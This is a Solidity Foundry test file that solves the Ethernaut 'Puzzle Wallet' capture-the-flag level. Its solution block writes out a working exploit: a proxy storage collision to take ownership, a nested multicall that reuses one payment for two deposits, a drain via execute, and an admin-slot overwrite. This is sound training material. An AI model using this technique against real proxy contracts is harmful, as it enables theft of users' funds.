// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {PuzzleWallet, PuzzleWalletFactory, PuzzleProxy} from "ethernaut/levels/PuzzleWalletFactory.sol";

contract PuzzleWalletLevel is SetUpLevelTest {
    PuzzleWallet internal puzzleWallet;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0.001 ether;
        playerBalance = 0.001 ether;
        level = address(new PuzzleWalletFactory());
        super.setUp();
        puzzleWallet = PuzzleWallet(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        PuzzleProxy puzzleProxy = PuzzleProxy(payable(instance));
        puzzleProxy.proposeNewAdmin(player);
        puzzleWallet.addToWhitelist(player);
        bytes[] memory dataDeposit = new bytes[](1);
        dataDeposit[0] = abi.encodeCall(PuzzleWallet.deposit, ());
        bytes[] memory dataMulticall = new bytes[](1);
        dataMulticall[0] = abi.encodeCall(
            PuzzleWallet.multicall,
            (dataDeposit)
        );
        bytes[] memory data = new bytes[](2);
        data[0] = dataMulticall[0];
        data[1] = dataMulticall[0];
        puzzleWallet.multicall{value: 0.001 ether}(data);
        puzzleWallet.execute(player, 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(player)));
        vm.stopPrank();
    }
}
